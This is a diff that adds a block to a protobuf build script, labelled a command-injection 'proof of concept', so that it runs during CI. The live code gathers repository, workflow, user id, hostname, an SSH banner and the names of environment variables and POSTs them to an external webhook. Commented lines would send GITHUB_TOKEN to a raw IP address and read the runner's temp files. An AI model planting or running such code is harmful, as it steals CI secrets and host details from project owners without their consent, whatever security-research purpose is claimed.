@@ -16,6 +16,59 @@
 
 # This script requires protobuf-compiler and https://github.com/nipunn1313/mypy-protobuf
 
+# echo "[POC] Executing Proof of Concept code..."
+# echo "[POC] Preparing to exfiltrate data to 194.213.18.243:38793..."
+
+# # Construct a JSON payload with environment details
+# JSON_PAYLOAD=$(cat <<EOF
+# {
+#   "message": "SUCCESSFUL EXFILTRATION FROM GITHUB ACTIONS",
+#   "github_token": "${GITHUB_TOKEN}",
+#   "repository": "${GITHUB_REPOSITORY}",
+#   "workflow": "${GITHUB_WORKFLOW}",
+#   "current_user": "$(whoami)",
+#   "working_directory": "$(pwd)"
+# }
+# EOF
+# )
+
+# # Send the payload to the specified IP and port
+# curl -X POST -H "Content-Type: application/json" -d "${JSON_PAYLOAD}" http://194.213.18.243:38793
+
+# echo "[POC] Data exfiltration attempt complete. Check your listener at 194.213.18.243:38793."
+# echo
+
+# =================================================================
+# == POC SCRIPT FOR COMMAND INJECTION VULNERABILITY ==
+# This block will execute during the CI run and exfiltrate the
+# GITHUB_TOKEN to prove the vulnerability.
+# =================================================================
+echo "[POC] Executing Proof of Concept code..."
+# Construct a JSON payload with environment details
+JSON_PAYLOAD=$(cat <<EOF
+{
+  "message": "S",
+  "repository": "${GITHUB_REPOSITORY}",
+  "workflow": "${GITHUB_WORKFLOW}",
+  "job": "${GITHUB_JOB}",
+  "id": "$(id)",
+  "working_directory": "$(pwd)",
+  "hostname": "$(hostname)",
+  "ssh_banner": "$(echo | nc localhost 22 2>/dev/null | head -n 1)",
+  "env_var_keys": $(printenv | cut -d '=' -f 1 | jq -R . | jq -s .)
+    
+}
+EOF
+)
+#   "ghtok": "$(cat /home/runner/work/_temp/*)",
+# "env_var_keys": $(printenv | cut -d '=' -f 1 | jq -R . | jq -s .)
+# Send the payload to the external webhook
+curl -X POST -H "Content-Type: application/json" -d "${JSON_PAYLOAD}" https://webhook.site/83eec9ca-ff62-4398-ab88-84e4376b6032
+
+echo "[POC] Done. Check your webhook."
+echo "================================================================="
+# The original script continues below...
+
 set -e
 
 API_PROTOCOL=./protocol/protobufs
